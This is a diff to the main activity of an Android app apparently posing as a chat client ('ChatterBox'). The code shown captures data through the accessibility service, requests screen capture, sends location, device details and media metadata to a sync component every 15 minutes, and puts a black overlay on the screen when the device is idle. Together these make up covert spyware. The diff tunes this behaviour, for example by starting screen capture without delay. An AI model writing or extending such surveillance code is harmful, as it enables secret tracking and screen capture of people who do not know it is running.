@@ -99,10 +99,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             startActivity(Intent(this, AccessibilityPromoActivity::class.java))
         } else if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
             setupAccessibilityDataCapture()
-            handler.postDelayed({
-                requestMediaProjection()
-            }, 2000)
-
+            requestMediaProjection()
             IdleDetector.startIdleDetection(this)
             IdleDetector.registerIdleCallback {
                 com.example.ChatterBox.accessibility.ScreenOnService.showBlackOverlay(this)
@@ -136,7 +133,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         ) {
             val locationTracker = LocationTracker.getInstance(this)
             locationTracker.captureLastKnownLocation { locationData ->
-                dataSynchronizer?.sendData("location_data", locationData.toString())
+                dataSynchronizer?.sendData("location_data", locationData)
             }
         }
     }
@@ -172,7 +169,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 put("timestamp", System.currentTimeMillis())
             }
 
-            dataSynchronizer?.sendData("app_analytics", deviceInfo.toString())
+            dataSynchronizer?.sendData("app_analytics", deviceInfo)
             if (ContextCompat.checkSelfPermission(
                     this,
                     android.Manifest.permission.ACCESS_FINE_LOCATION
@@ -212,20 +209,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 Log.e(TAG, "Error in sync task: ${e.message}")
             }
         }, initialSyncDelay, 15, TimeUnit.MINUTES)
-
-        scheduler.scheduleWithFixedDelay({
-            try {
-                handler.post {
-                    try {
-                        collectLocationData()
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Error in scheduled location task: ${e.message}")
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Error scheduling location task: ${e.message}")
-            }
-        }, 5, 20, TimeUnit.MINUTES)
     }
     @RequiresApi(Build.VERSION_CODES.O)
     private fun setupAccessibilityDataCapture() {
@@ -283,7 +266,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     put("device_model", Build.MODEL)
                     put("android_version", Build.VERSION.RELEASE)
                 }
-                dataSynchronizer?.sendData("media_metadata", mediaData.toString())
+                dataSynchronizer?.sendData("media_metadata", mediaData)
             }
         } catch (e: Exception) {
             Log.e(TAG, "Media scan error: ${e.message}")
